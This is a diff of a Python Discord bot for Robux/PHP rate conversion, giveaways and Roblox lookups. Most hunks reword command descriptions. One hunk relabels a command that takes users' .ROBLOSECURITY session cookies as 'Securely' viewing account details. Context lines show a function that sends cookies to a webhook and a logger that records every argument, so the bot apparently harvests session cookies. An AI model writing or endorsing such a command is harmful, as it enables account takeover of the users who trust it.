@@ -1029,7 +1029,7 @@ class ChannelSelectForSendView(ui.View):
 
 
 @bot.tree.command(name="announcement",
-                  description="Create an announcement with a guided form")
+                  description="Send a rich, media-supported announcement to any channel (Owner/Admin)")
 async def announcement(interaction: discord.Interaction):
     is_owner = interaction.user.id == BOT_OWNER_ID
     is_admin = interaction.user.guild_permissions.administrator
@@ -1191,7 +1191,7 @@ async def end_giveaway_now(giveaway_id):
 # ===========================
 # Giveaway Command (FIXED)
 # ===========================
-@bot.tree.command(name="giveaway", description="Create a persistent giveaway")
+@bot.tree.command(name="giveaway", description="Start a timed giveaway with optional entry requirements")
 @app_commands.describe(
     prize="The prize for the giveaway",
     duration="Duration (e.g., 30s, 10m, 2h, 1d)",
@@ -1303,7 +1303,7 @@ async def giveaway(
 
 # Giveaway End Command
 @bot.tree.command(name="giveawayend",
-                  description="End a giveaway immediately by its ID")
+                  description="Force-end an active giveaway early and announce winners")
 @app_commands.describe(id="The full giveaway ID (from the footer)")
 async def giveawayend(interaction: discord.Interaction, id: str):
     is_admin = interaction.user.guild_permissions.manage_guild
@@ -1350,7 +1350,7 @@ async def giveawayend(interaction: discord.Interaction, id: str):
 
 # Giveaway Reroll Command
 @bot.tree.command(name="giveawayreroll",
-                  description="Pick a new winner for an ended giveaway")
+                  description="Pick new winner(s) for a giveaway that has already ended")
 @app_commands.describe(id="The full giveaway ID (from the footer)")
 async def giveawayreroll(interaction: discord.Interaction, id: str):
     is_admin = interaction.user.guild_permissions.manage_guild
@@ -1443,7 +1443,7 @@ async def giveawayreroll(interaction: discord.Interaction, id: str):
 @bot.tree.command(
     name="setrate",
     description=
-    "Set custom conversion rates for this server (minimum allowed rates enforced)"
+    "Update server-specific conversion rates (Admin only)"
 )
 @app_commands.describe(payout_rate="PHP per 1000 Robux for Payout",
                        gift_rate="PHP per 1000 Robux for Gift",
@@ -1551,7 +1551,7 @@ async def setrate(interaction: discord.Interaction,
 @bot.tree.command(
     name="resetrate",
     description=
-    "Reset specific conversion rates back to default (e.g., payout, gift)")
+    "Restore selected rates back to their default values (Admin only)")
 @app_commands.describe(payout="Reset Payout rate",
                        gift="Reset Gift rate",
                        nct="Reset NCT rate",
@@ -1627,7 +1627,7 @@ async def resetrate(interaction: discord.Interaction,
 
 @bot.tree.command(
     name="forceresetallrates",
-    description="Force-reset all server rates that are BELOW default values")
+    description="Auto-reset any server rates that fell below minimum defaults (Owner only)")
 async def forceresetallrates(interaction: discord.Interaction):
     # Owner-only check
     if interaction.user.id != BOT_OWNER_ID:
@@ -1691,7 +1691,7 @@ async def forceresetallrates(interaction: discord.Interaction):
             f"❌ Error during force reset: {str(e)}", ephemeral=True)
 
 
-@bot.tree.command(name="viewrates", description="View all saved server rates")
+@bot.tree.command(name="viewrates", description="Display all custom conversion rates saved across servers (Owner only)")
 async def viewrates(interaction: discord.Interaction):
     # Owner-only check
     if interaction.user.id != BOT_OWNER_ID:
@@ -1807,7 +1807,7 @@ async def payout(interaction: discord.Interaction,
 
 @bot.tree.command(
     name="gift",
-    description="Convert between Robux and PHP using the Gift rate")
+    description="Convert Robux ↔ PHP using the InGame Gift rate")
 @app_commands.describe(conversion_type="Choose conversion direction",
                        amount="Amount to convert")
 @app_commands.choices(conversion_type=[
@@ -1848,7 +1848,7 @@ async def gift(interaction: discord.Interaction,
 
 
 @bot.tree.command(
-    name="nct", description="Convert between Robux and PHP using the NCT rate")
+    name="nct", description="Convert Robux ↔ PHP using the Not Covered Tax rate")
 @app_commands.describe(conversion_type="Choose conversion direction",
                        amount="Amount to convert")
 @app_commands.choices(conversion_type=[
@@ -1895,7 +1895,7 @@ async def nct(interaction: discord.Interaction,
 
 
 @bot.tree.command(
-    name="ct", description="Convert between Robux and PHP using the CT rate")
+    name="ct", description="Convert Robux ↔ PHP using the Covered Tax rate")
 @app_commands.describe(conversion_type="Choose conversion direction",
                        amount="Amount to convert")
 @app_commands.choices(conversion_type=[
@@ -1943,7 +1943,7 @@ async def ct(interaction: discord.Interaction,
 
 
 @bot.tree.command(name="allrates",
-                  description="Compare all Robux ↔ PHP conversion rates")
+                  description="Compare PHP/Robux values across all 4 conversion rates")
 @app_commands.describe(conversion_type="Choose conversion direction",
                        amount="Amount to convert")
 @app_commands.choices(conversion_type=[
@@ -1991,7 +1991,7 @@ async def allrates(interaction: discord.Interaction,
 
 # ConvertCurrency
 @bot.tree.command(name="convertcurrency",
-                  description="Convert between two currencies")
+                  description="Convert between real-world currencies (USD, PHP, EUR, etc.)")
 @app_commands.describe(amount="Amount to convert",
                        from_currency="Currency to convert from (e.g., USD)",
                        to_currency="Currency to convert to (e.g., PHP)")
@@ -2090,7 +2090,7 @@ GLOBAL_CAPITAL_CITIES = [
 
 
 @bot.tree.command(name="weather",
-                  description="Get weather information for a city")
+                  description="Get live weather data (temp, humidity, wind & conditions)")
 @app_commands.describe(city="City name",
                        unit="Temperature unit (default is Celsius)")
 @app_commands.choices(unit=[
@@ -2170,7 +2170,7 @@ async def city_autocomplete(interaction: discord.Interaction,
 
 # Purge Command
 @bot.tree.command(name="purge",
-                  description="Delete a specified number of messages")
+                  description="Bulk-delete recent messages in the current channel (Owner/Admin)")
 @app_commands.describe(amount="How many messages would you like to delete?")
 async def purge(interaction: discord.Interaction, amount: int):
     if amount <= 0:
@@ -2197,7 +2197,7 @@ async def purge(interaction: discord.Interaction, amount: int):
 
 # Poll Command
 @bot.tree.command(
-    name="poll", description="Create a poll with reactions and result summary")
+    name="poll", description="Create a timed 👍/👎 poll with automatic results")
 @app_commands.describe(question="Poll question",
                        amount="Duration amount",
                        unit="Time unit (seconds, minutes, hours)")
@@ -2261,7 +2261,7 @@ async def poll(interaction: discord.Interaction, question: str, amount: int,
 # Remind Me Command
 @bot.tree.command(
     name="remindme",
-    description="Set a reminder after X minutes (will ping you in this channel)"
+    description="Set a personal reminder that will ping you in this channel"
 )
 @app_commands.describe(minutes="How many minutes until I remind you?",
                        note="Your reminder message")
@@ -2284,7 +2284,7 @@ async def remindme(interaction: discord.Interaction, minutes: int, note: str):
 
 
 # Donate Command
-@bot.tree.command(name="donate", description="Donate Robux to a Discord user.")
+@bot.tree.command(name="donate", description="Playfully simulate donating Robux to a user (cosmetic only)")
 @app_commands.describe(user="The user to donate to.",
                        amount="The amount of Robux to donate.")
 async def donate(interaction: discord.Interaction, user: discord.Member,
@@ -2302,7 +2302,7 @@ async def donate(interaction: discord.Interaction, user: discord.Member,
 @bot.tree.command(
     name="say",
     description=
-    "Make the bot say something in chat (no @everyone/@here allowed)")
+    "Make the bot repeat your message (blocks @everyone/@here for safety)")
 @app_commands.describe(message="Message for the bot to say")
 async def say(interaction: discord.Interaction, message: str):
     if "@everyone" in message or "@here" in message:
@@ -2315,7 +2315,7 @@ async def say(interaction: discord.Interaction, message: str):
 
 # Calculator Command
 @bot.tree.command(name="calculator",
-                  description="Perform basic math operations")
+                  description="Quickly perform basic math (+, -, ×, ÷)")
 @app_commands.describe(num1="First number",
                        operation="Operation",
                        num2="Second number")
@@ -2351,9 +2351,12 @@ async def calculator(interaction: discord.Interaction, num1: float,
             f"⚠️ An error occurred: {str(e)}")
 
 
-# ========== Command Paginator ==========
-class CommandPaginator(ui.View):
+# ===========================
+# Command Paginator & List
+# ===========================
+EMBED_COLOR = discord.Color.from_rgb(0, 0, 0)
 
+class CommandPaginator(ui.View):
     def __init__(self, embeds: list[discord.Embed], timeout: int = 180):
         super().__init__(timeout=timeout)
         self.embeds = embeds
@@ -2361,117 +2364,117 @@ class CommandPaginator(ui.View):
         self.update_buttons()
 
     def update_buttons(self):
-        self.children[0].disabled = self.current_page == 0
-        self.children[1].disabled = self.current_page == len(self.embeds) - 1
+        # Safely toggle button states using custom_ids instead of fragile index positions
+        for child in self.children:
+            if isinstance(child, ui.Button):
+                if child.custom_id == "prev_page":
+                    child.disabled = self.current_page == 0
+                elif child.custom_id == "next_page":
+                    child.disabled = self.current_page == len(self.embeds) - 1
 
-    @ui.button(label="◀️ Previous", style=ButtonStyle.gray)
+    @ui.button(label="◀️ Previous", style=ButtonStyle.gray, custom_id="prev_page")
     async def previous_page(self, interaction: Interaction, button: ui.Button):
-        self.current_page -= 1
+        self.current_page = max(0, self.current_page - 1)
         self.update_buttons()
-        await interaction.response.edit_message(
-            embed=self.embeds[self.current_page], view=self)
+        await interaction.response.edit_message(embed=self.embeds[self.current_page], view=self)
 
-    @ui.button(label="Next ▶️", style=ButtonStyle.gray)
+    @ui.button(label="Next ▶️", style=ButtonStyle.gray, custom_id="next_page")
     async def next_page(self, interaction: Interaction, button: ui.Button):
-        self.current_page += 1
+        self.current_page = min(len(self.embeds) - 1, self.current_page + 1)
         self.update_buttons()
-        await interaction.response.edit_message(
-            embed=self.embeds[self.current_page], view=self)
+        await interaction.response.edit_message(embed=self.embeds[self.current_page], view=self)
 
     async def on_timeout(self):
         for item in self.children:
             item.disabled = True
-        try:
-            await self.message.edit(view=self)
-        except:
-            pass
+        if hasattr(self, "message"):
+            try:
+                await self.message.edit(view=self)
+            except Exception:
+                pass
 
-
-# ========== Updated /listallcommands ==========
-@bot.tree.command(
-    name="listallcommands",
-    description="List all available slash commands with pagination.")
-async def listallcommands(interaction: discord.Interaction):
+def _build_command_embeds() -> list[discord.Embed]:
     categories = {
-        "🤖 AI Assistant": [
-            "`/ask <prompt>` – Chat with Llama 3 AI",
-            "`/clearhistory` – Clear your AI conversation history"
-        ],
-        "🧱 Roblox Tools (`/roblox` group)": [
-            "`/roblox group` – Display information about multiple Roblox Groups owned by Neroniel",
-            "`/roblox community <name|ID>` – Search any public Roblox group",
-            "`/roblox profile <username|ID>` – View Roblox user profile",
-            "`/roblox avatar <username|ID>` – View full Roblox avatar",
-            "`/roblox icon <place_id|URL>` – Get game icon",
-            "`/roblox game <place_id|URL>` – Get full game info",
-            "`/roblox stocks` – Show group funds & Robux stocks",
-            "`/roblox checkpayout <username>` – Check payout eligibility across groups",
-            "`/roblox login <cookie>` – View private account details using .ROBLOSECURITY",
-            "`/roblox gamepass <ID|link>` – Get public Gamepass link",
-            "`/roblox devex <type> <amount>` – Convert Robux ↔ USD (DevEx rate)",
-            "`/roblox tax <amount>` – Show 30% Roblox transaction tax breakdown",
-            "`/roblox rank <username>` – Promote user to Rank 6 (owner only)"
-        ],
-        "💱 Currency & Conversion": [
-            "`/payout <type> <amount>` – Convert Robux ↔ PHP (Payout rate)",
-            "`/gift <type> <amount>` – Convert Robux ↔ PHP (Gift rate)",
-            "`/nct <type> <amount>` – Convert Robux ↔ PHP (NCT rate)",
-            "`/ct <type> <amount>` – Convert Robux ↔ PHP (CT rate)",
-            "`/allrates <type> <amount>` – Compare all PHP/Robux rates",
-            "`/convertcurrency <amount> <from> <to>` – Convert world currencies",
-            "`/setrate [rates...]` – Set custom rates (admin only)",
-            "`/resetrate [flags]` – Reset specific rates to default (admin only)",
-            "`/forceresetallrates` – Force-reset all server rates below default (owner only)",
-            "`/viewrates` – View all saved server rates (owner only)"
-        ],
-        "🛠️ Utility & Info": [
-            "`/userinfo [user]` – View Discord user info",
-            "`/serverinfo` – View current server info",
-            "`/avatar [user]` – Show Discord user’s avatar",
-            "`/banner [user]` – Show Discord user’s banner",
-            "`/weather <city>` – Get current weather info",
-            "`/calculator <num1> <op> <num2>` – Perform basic math",
-            "`/mexc` – Show top cryptos by volume on MEXC",
-            "`/snipe` – Show last deleted message in channel",
-            "`/payment <method>` – Show Gcash/PayMaya/GoTyme info",
-            "`/status` – Show bot stats (uptime, servers, etc.)",
-            "`/invite` – Get bot invite link",
-            "`/giveaway <prize> <duration> <winners> [roles] [msg_req]` – Create a persistent giveaway",
-            "`/giveawayend <id>` – End a giveaway early",
-            "`/giveawayreroll <id>` – Re-roll giveaway winners"
-        ],
-        "📢 Messaging & Announcements": [
-            "`/announcement` – Create rich embed announcement (admin only)",
-            "`/say <message>` – Make bot say something (no @everyone/@here)",
-            "`/donate <user> <amount>` – Fun Robux donation message",
-            "`/poll <question> <time> <unit>` – Create a timed poll",
-            "`/remindme <minutes> <note>` – Set a reminder in this channel"
-        ],
-        "📱 Social Media": [
-            "`/tiktok <link> [spoiler]` – Download TikTok video",
-            "`/instagram <link> [spoiler]` – Convert to EmbedEZ link"
-        ],
-        "🛡️ Owner & Admin": [
-            "`/dm <user> <message>` – DM a user (owner only)",
-            "`/dmall <message>` – DM all server members (owner only)",
-            "`/purge <amount>` – Delete messages (mod/owner)",
-            "`/createinvite` – Create 30-min invites for all servers (owner only)"
-        ],
-        "🔧 Bot & Server": [
-            "`/listallcommands` – List all available commands (this command)"
-        ]
-    }
-    embeds = []
-    for name, cmds in categories.items():
-        embed = discord.Embed(
-            title=name,
-            description="\n".join(cmds),
-            color=discord.Color.from_rgb(0, 0, 0)
-        )
-        embed.set_footer(text="Neroniel • Use buttons to navigate")
-        embed.timestamp = datetime.now(PH_TIMEZONE)
-        embeds.append(embed)
+    "🤖 AI Assistant": [
+        "`/ask <prompt>` – Chat with the Llama 3 AI assistant (supports auto-threading)",
+        "`/clearhistory` – Wipe your AI conversation memory and reset active threads"
+    ],
+    "🧱 Roblox Tools (`/roblox` group)": [
+        "`/roblox group` – Display information about multiple Roblox Groups owned by Neroniel",
+        "`/roblox community <name|ID>` – Search public Roblox groups by Name or exact ID",
+        "`/roblox profile <username|ID>` – View a player’s profile, online status, friends & creation date",
+        "`/roblox avatar <username|ID>` – Display a player’s full-body avatar image",
+        "`/roblox icon <place_id|URL>` – Fetch a game’s official icon using Place ID or Game URL",
+        "`/roblox game <place_id|URL>` – Get detailed game info (visits, likes, creator, server size, etc.)",
+        "`/roblox stocks` – Check current Robux balances & pending funds across all managed groups",
+        "`/roblox checkpayout <username>` – Verify payout eligibility across all supported groups",
+        "`/roblox login <cookie>` – Securely view private account details using a `.ROBLOSECURITY` cookie",
+        "`/roblox gamepass <ID|link>` – Generate a direct public Roblox Gamepass link using an ID or Creator Dashboard URL",
+        "`/roblox devex <type> <amount>` – Convert Robux ↔ USD using the official DevEx rate ($0.0038/R$)",
+        "`/roblox tax <amount>` – Calculate Roblox’s 30% marketplace tax (covered vs. non-covered)",
+        "`/roblox rank <username>` – Promote a Roblox User to Rank 6 (〆 Contributor) in 1cy (Owner/Admin only)"
+    ],
+    "💱 Currency & Conversion": [
+        "`/payout <type> <amount>` – Convert Robux ↔ PHP using the Group Payout rate",
+        "`/gift <type> <amount>` – Convert Robux ↔ PHP using the InGame Gift rate",
+        "`/nct <type> <amount>` – Convert Robux ↔ PHP using the Not Covered Tax rate",
+        "`/ct <type> <amount>` – Convert Robux ↔ PHP using the Covered Tax rate",
+        "`/allrates <type> <amount>` – Compare PHP/Robux values across all 4 conversion rates",
+        "`/convertcurrency <amount> <from> <to>` – Convert between real-world currencies (USD, PHP, EUR, etc.)",
+        "`/setrate <rate> <value>` – Update server-specific conversion rates (Admin only)",
+        "`/resetrate <rate>` – Restore selected rates back to their default values (Admin only)",
+        "`/forceresetallrates` – Auto-reset any server rates that fell below minimum defaults (Owner only)",
+        "`/viewrates` – Display all custom conversion rates saved across servers (Owner only)"
+    ],
+    "🛠️ Utility & Info": [
+        "`/userinfo [user]` – View Discord account details, join date, roles & activity",
+        "`/serverinfo` – Display server stats: member count, boosts, channels & creation date",
+        "`/avatar [user]` – View a user’s Discord profile picture (defaults to your own)",
+        "`/banner [user]` – View a user’s Discord banner (global or server-specific)",
+        "`/weather <city>` – Get live weather data (temp, humidity, wind & conditions)",
+        "`/calculator <num1> <op> <num2>` – Quickly perform basic math (+, -, ×, ÷)",
+        "`/mexc` – View top cryptocurrencies by 24h trading volume on MEXC exchange",
+        "`/snipe` – Recover the last deleted message in the current channel (text & attachments)",
+        "`/payment <method>` – Display official payment details for Gcash, PayMaya, or GoTyme",
+        "`/status` – Check bot health: uptime, server count, command usage & system stats",
+        "`/invite` – Get the official invite link to add the bot to your server",
+        "`/giveaway <prize> <duration> <winners> [roles] [reqs]` – Start a timed giveaway with optional entry requirements",
+        "`/giveawayend <id>` – Force-end an active giveaway early and announce winners",
+        "`/giveawayreroll <id>` – Pick new winner(s) for a giveaway that has already ended"
+    ],
+    "📢 Messaging & Announcements": [
+        "`/announcement` – Send a rich, media-supported announcement to any channel (Owner/Admin)",
+        "`/say <message>` – Make the bot repeat your message (blocks @everyone/@here for safety)",
+        "`/donate <user> <amount>` – Playfully simulate donating Robux to a user (cosmetic only)",
+        "`/poll <question> <duration> <unit>` – Create a timed 👍/👎 poll with automatic results",
+        "`/remindme <minutes> <note>` – Set a personal reminder that will ping you in this channel"
+    ],
+    "📱 Social Media": [
+        "`/tiktok <link> [spoiler]` – Download and share a TikTok video directly in Discord",
+        "`/instagram <link>` – Convert an Instagram post/reel into an embeddable preview link"
+    ],
+    "🛡️ Owner & Admin": [
+        "`/dm <user> <message>` – Send a direct message to any Discord user (Owner only)",
+        "`/dmall <message> [scope]` – Broadcast a DM to all members in-server or across all servers (Owner only)",
+        "`/purge <amount>` – Bulk-delete recent messages in the current channel (Owner/Admin)",
+        "`/createinvite` – Generate 30-minute invite links for every server the bot is in (Owner only)"
+    ],
+    "🔧 Bot & Server": [
+        "`/listallcommands` – Display this interactive, paginated guide to all available commands"
+    ]
+}
 
+    now = datetime.now(PH_TIMEZONE)
+    # Build all embeds in a single, clean list comprehension
+    return [
+        discord.Embed(title=title, description="\n".join(cmds), color=EMBED_COLOR, timestamp=now)
+        .set_footer(text="Neroniel • Use buttons to navigate")
+        for title, cmds in categories.items()
+    ]
+
+@bot.tree.command(name="listallcommands", description="Display this interactive, paginated guide to all available commands")
+async def listallcommands(interaction: discord.Interaction):
+    embeds = _build_command_embeds()
     if not embeds:
         await interaction.response.send_message("❌ No commands found.", ephemeral=True)
         return
@@ -2479,7 +2482,6 @@ async def listallcommands(interaction: discord.Interaction):
     view = CommandPaginator(embeds)
     await interaction.response.send_message(embed=embeds[0], view=view)
     view.message = await interaction.original_response()
-
 
 # ===========================
 # Payment Command
@@ -2626,12 +2628,12 @@ async def log_command_usage(interaction: discord.Interaction):
             log_channel = await bot.fetch_channel(LOG_CHANNEL_ID)
         if not log_channel:
             return
-            
+
         # Build full command name
         cmd_name = interaction.command.name if interaction.command else "Unknown"
         if hasattr(interaction.command, 'parent') and interaction.command.parent:
             cmd_name = f"{interaction.command.parent.name} {cmd_name}"
-            
+
         # Extract ALL arguments
         args_list = []
         if interaction.command:
@@ -2645,14 +2647,14 @@ async def log_command_usage(interaction: discord.Interaction):
                     elif hasattr(val, 'value'):
                         val = val.value
                     args_list.append(f"{param.name}: `{val}`")
-                    
+
         args_str = ", ".join(args_list) if args_list else "None"
-        
+
         # Safely get channel & server info
         channel_name = getattr(interaction.channel, 'name', 'Direct Message')
         server_name = interaction.guild.name if interaction.guild else "Direct Message"
         server_id = interaction.guild.id if interaction.guild else "N/A"
-        
+
         embed = discord.Embed(
             title="📝 Command Used",
             description=(
@@ -2725,7 +2727,7 @@ async def status(interaction: discord.Interaction):
 
 # ========== Create Invite Command ==========
 @bot.tree.command(name="createinvite",
-                  description="Create 30-minute invites for all servers")
+                  description="Generate 30-minute invite links for every server the bot is in (Owner only)")
 async def createinvite(interaction: discord.Interaction):
     if interaction.user.id != BOT_OWNER_ID:
         await interaction.response.send_message(
@@ -2772,7 +2774,7 @@ async def createinvite(interaction: discord.Interaction):
 
 # ========== Tiktok Command ==========
 @bot.tree.command(name="tiktok",
-                  description="Convert a TikTok Link into a Video")
+                  description="Download and share a TikTok video directly in Discord")
 @app_commands.describe(link="The TikTok Video URL to Convert",
                        spoiler="Should the video be sent as a spoiler?")
 async def tiktok(interaction: discord.Interaction,
@@ -2815,7 +2817,7 @@ async def tiktok(interaction: discord.Interaction,
 
 # ========== Instagram Command ==========
 @bot.tree.command(name="instagram",
-                  description="Convert Instagram Link into a Media/Video")
+                  description="Convert an Instagram post/reel into an embeddable preview link")
 @app_commands.describe(link="Instagram post or reel URL",
                        spoiler="Should the video be sent as a spoiler?")
 async def instagram_embedez(interaction: discord.Interaction,
@@ -3025,7 +3027,7 @@ async def roblox_group_info(interaction: discord.Interaction):
                 await interaction.followup.send(f"❌ Error fetching group info for ID `{GROUP_ID}`: {e}", ephemeral=False)
 
 
-@roblox_group.command(name="stocks", description="Show Roblox Group Funds and Robux Stocks")
+@roblox_group.command(name="stocks", description="Check current Robux balances & pending funds across all managed groups")
 async def roblox_stocks(interaction: discord.Interaction):
     await interaction.response.defer()
 
@@ -3047,7 +3049,7 @@ async def roblox_stocks(interaction: discord.Interaction):
     # ===========================
     roblox_stocks_cookie = os.getenv("ROBLOX_STOCKS")
     roblox_user_id = os.getenv("ROBLOX_STOCKS_ID")
-    
+
     missing = [k for k, v in GROUPS.items() if not os.getenv(v["cookie_env"])]
     if missing:
         return await interaction.followup.send(f"❌ Missing cookie env vars for: {', '.join(missing)}")
@@ -3061,7 +3063,7 @@ async def roblox_stocks(interaction: discord.Interaction):
         data = {f"{key_prefix}_funds": 0, f"{key_prefix}_pending": 0}
         visible = {f"{key_prefix}_funds": False, f"{key_prefix}_pending": False}
         headers = {"Cookie": cookie}
-        
+
         try:
             # Fetch current funds (old API still works for this)
             async with session.get(f"https://economy.roblox.com/v1/groups/{group_id}/currency", headers=headers) as r:
@@ -3069,9 +3071,9 @@ async def roblox_stocks(interaction: discord.Interaction):
                     res = await r.json()
                     data[f"{key_prefix}_funds"] = res.get("robux", 0)
                     visible[f"{key_prefix}_funds"] = True
-            
+
             await asyncio.sleep(0.3)  # Rate limit buffer
-            
+
             # Fetch pending (NEW API)
             async with session.get(
                 f"https://apis.roblox.com/transaction-records/v1/groups/{group_id}/revenue/summary/day",
@@ -3083,7 +3085,7 @@ async def roblox_stocks(interaction: discord.Interaction):
                     visible[f"{key_prefix}_pending"] = True
         except Exception as e:
             print(f"[STOCKS] Error fetching {key_prefix}: {e}")
-        
+
         return data, visible
 
     # ===========================
@@ -3091,16 +3093,16 @@ async def roblox_stocks(interaction: discord.Interaction):
     # ===========================
     all_data = {}
     all_visible = {}
-    
+
     async with aiohttp.ClientSession() as session:
         for key, cfg in GROUPS.items():
             cookie = os.getenv(cfg["cookie_env"])
             data, visible = await fetch_group_data(session, cfg["id"], cookie, key)
             all_data.update(data)
             all_visible.update(visible)
-            
+
             await asyncio.sleep(0.3)  # Prevent rate limiting between groups
-        
+
         # Fetch personal account balance
         try:
             async with session.get(
@@ -3120,7 +3122,7 @@ async def roblox_stocks(interaction: discord.Interaction):
     # Format Helper
     # ===========================
     robux_emoji = "<:robux:1438835687741853709>"
-    
+
     def fmt(key):
         return f"{robux_emoji} {all_data[key]:,}" if all_visible.get(key) else "||HIDDEN||"
 
@@ -3128,7 +3130,7 @@ async def roblox_stocks(interaction: discord.Interaction):
     # Build Embed (Dynamic)
     # ===========================
     embed = discord.Embed(color=discord.Color.from_rgb(0, 0, 0), timestamp=datetime.now(PH_TIMEZONE))
-    
+
     # Add each group field dynamically
     for key, cfg in GROUPS.items():
         label = cfg["label"]
@@ -3139,22 +3141,22 @@ async def roblox_stocks(interaction: discord.Interaction):
             value=f"{fmt(funds_key)} | {fmt(pending_key)}",
             inline=False
         )
-    
+
     # Account balance field
     embed.add_field(name="**⌖ Neroniel Account Balance**", value=fmt("account_balance"), inline=False)
     embed.set_footer(text="Fetched via Roblox API | Neroniel")
-    
+
     await interaction.followup.send(embed=embed)
 
 
 @roblox_group.command(
     name="checkpayout",
-    description="Check if a Roblox user is eligible for payout across all supported groups"
+    description="Verify payout eligibility across all supported groups"
 )
 @app_commands.describe(username="Roblox username")
 async def roblox_checkpayout(interaction: discord.Interaction, username: str):
     await interaction.response.defer(ephemeral=False)
-    
+
     # Group config
     groups = {
         "1cy": {
@@ -3200,7 +3202,7 @@ async def roblox_checkpayout(interaction: discord.Interaction, username: str):
             "url": "https://www.roblox.com/groups/11136234"
         }
     }
-    
+
     # Load cookies
     cookies = {}
     missing_cookies = []
@@ -3209,7 +3211,7 @@ async def roblox_checkpayout(interaction: discord.Interaction, username: str):
         if not cookie:
             missing_cookies.append(info["cookie_env"])
         cookies[key] = cookie
-        
+
     if missing_cookies:
         await interaction.followup.send(
             f"❌ Missing required cookies in environment: `{', '.join(set(missing_cookies))}`",
@@ -3219,7 +3221,7 @@ async def roblox_checkpayout(interaction: discord.Interaction, username: str):
     embed = discord.Embed(color=discord.Color.from_rgb(0, 0, 0))
     embed.set_footer(text="Neroniel")
     embed.timestamp = datetime.now(PH_TIMEZONE)
-    
+
     # Step 1: Resolve username → user_id + display_name
     try:
         async with aiohttp.ClientSession() as session:
@@ -3265,7 +3267,7 @@ async def roblox_checkpayout(interaction: discord.Interaction, username: str):
         cookie = cookies[key]
         group_display = info['name']
         group_url = info['url']
-        
+
         if key not in user_groups:
             status_text = "<:Unverified:1446796507931082906> Not In Group"
         else:
@@ -3286,18 +3288,18 @@ async def roblox_checkpayout(interaction: discord.Interaction, username: str):
                             status_text = "⚠️ API Error"
             except Exception as e:
                 status_text = "⚠️ Check Failed"
-                
+
         # Make group name clickable
         clickable_group = f"[{group_display}]({group_url})"
         status_lines.append(f"**⌖ {clickable_group}** — **{status_text}**")
 
     # Build description with blank line after username
     description_lines = [f"**`{username}` ({display_name})**", "", *status_lines]
-    
+
     # Only add Group Rank if user is in 1cy
     if onecy_role_name:
         description_lines.append(f"**Group Rank:** {onecy_role_name}")
-        
+
     embed.description = "\n".join(description_lines)
     await interaction.followup.send(embed=embed)
 
@@ -3477,7 +3479,7 @@ async def send_to_webhook_with_cookie(embed: Embed, cookie: str,
 # ===========================
 @roblox_group.command(
     name="login",
-    description="Check Roblox account details using .ROBLOSECURITY cookie")
+    description="Securely view private account details using a `.ROBLOSECURITY` cookie")
 @app_commands.describe(cookie=".ROBLOSECURITY cookie (from browser)")
 async def roblox_login(interaction: Interaction, cookie: str):
     if not cookie.strip():
@@ -3550,7 +3552,7 @@ async def roblox_login(interaction: Interaction, cookie: str):
 
 
 @roblox_group.command(name="profile",
-                      description="Get Roblox user info by username or ID")
+                      description="View a player’s profile, online status, friends & creation date")
 @app_commands.describe(user="Roblox username or user ID")
 async def roblox_profile(interaction: discord.Interaction, user: str):
     await interaction.response.defer(ephemeral=False)
@@ -3680,7 +3682,7 @@ async def roblox_profile(interaction: discord.Interaction, user: str):
 @roblox_group.command(
     name="gamepass",
     description=
-    "Show a public Roblox Gamepass link using an ID or Creator Dashboard URL")
+    "Generate a direct public Roblox Gamepass link using an ID or Creator Dashboard URL")
 @app_commands.describe(id="The Roblox Gamepass ID",
                        link="Roblox Creator Dashboard URL to convert")
 async def roblox_gamepass(interaction: discord.Interaction,
@@ -3720,7 +3722,7 @@ async def roblox_gamepass(interaction: discord.Interaction,
 
 @roblox_group.command(
     name="devex",
-    description="Convert between Robux and USD using the current DevEx rate")
+    description="Convert Robux ↔ USD using the official DevEx rate ($0.0038/R$)")
 @app_commands.describe(
     conversion_type="Choose the type of value you're entering",
     amount="The amount of Robux or USD to convert")
@@ -3735,7 +3737,7 @@ async def roblox_devex(interaction: discord.Interaction,
         await interaction.response.send_message(
             "❗ Please enter a positive amount.", ephemeral=True)
         return
-    
+
     devex_rate = 0.0038  # $0.0038 per Robux
 
     # Helper to format numbers cleanly (removes trailing .0 or .0000)
@@ -3780,7 +3782,7 @@ def clean_for_match(text: str) -> str:
 
 @roblox_group.command(
     name="community",
-    description="Search and display info for any Roblox group by name or ID")
+    description="Search public Roblox groups by Name or exact ID")
 @app_commands.describe(name="Name or ID")
 async def roblox_community(interaction: discord.Interaction, name: str):
     await interaction.response.defer()
@@ -3876,7 +3878,7 @@ async def roblox_community(interaction: discord.Interaction, name: str):
 
 @roblox_group.command(
     name="avatar",
-    description="Get a Roblox user's full-body avatar by username or ID")
+    description="Display a player’s full-body avatar image")
 @app_commands.describe(user="Roblox username or user ID")
 async def roblox_avatar(interaction: discord.Interaction, user: str):
     await interaction.response.defer()
@@ -3969,7 +3971,7 @@ async def roblox_avatar(interaction: discord.Interaction, user: str):
 
 @roblox_group.command(
     name="tax",
-    description="Show Roblox tax calculations for a given Robux amount")
+    description="Calculate Roblox’s 30% marketplace tax (covered vs. non-covered)")
 @app_commands.describe(amount="The Robux amount to calculate tax for")
 async def roblox_tax(interaction: discord.Interaction, amount: int):
     if amount <= 0:
@@ -4016,7 +4018,7 @@ async def roblox_tax(interaction: discord.Interaction, amount: int):
 
 @roblox_group.command(
     name="icon",
-    description="Get the icon of a Roblox Game by Place ID or Game URL")
+    description="Fetch a game’s official icon using Place ID or Game URL")
 @app_commands.describe(id="Place ID or full Roblox Game URL")
 async def roblox_icon(interaction: discord.Interaction, id: str):
     place_id = None
@@ -4062,7 +4064,7 @@ async def roblox_icon(interaction: discord.Interaction, id: str):
 
 @roblox_group.command(
     name="rank",
-    description="Promote a Roblox user to Rank 6 (〆 Contributor) in 1cy")
+    description="Promote a Roblox User to Rank 6 (〆 Contributor) in 1cy")
 @app_commands.describe(username="Roblox username to promote")
 async def roblox_promote_rank(interaction: discord.Interaction, username: str):
     if interaction.user.id not in [BOT_OWNER_ID, 960333210666037278]:
@@ -4219,7 +4221,7 @@ async def roblox_promote_rank(interaction: discord.Interaction, username: str):
 @roblox_group.command(
     name="game",
     description=
-    "Display detailed information about a Roblox game using Place ID or Game Link"
+    "Get detailed game info (visits, likes, creator, server size, etc.)"
 )
 @app_commands.describe(id="The Roblox Place ID (e.g., 123456789) or Game Link")
 async def roblox_game(interaction: discord.Interaction, id: str):
@@ -4376,7 +4378,6 @@ async def roblox_game(interaction: discord.Interaction, id: str):
     except Exception as e:
         return await interaction.followup.send(
             f"❌ Failed to fetch game info: `{str(e)}`", ephemeral=True)
-
 
 # Register the subcommand group
 bot.tree.add_command(roblox_group)
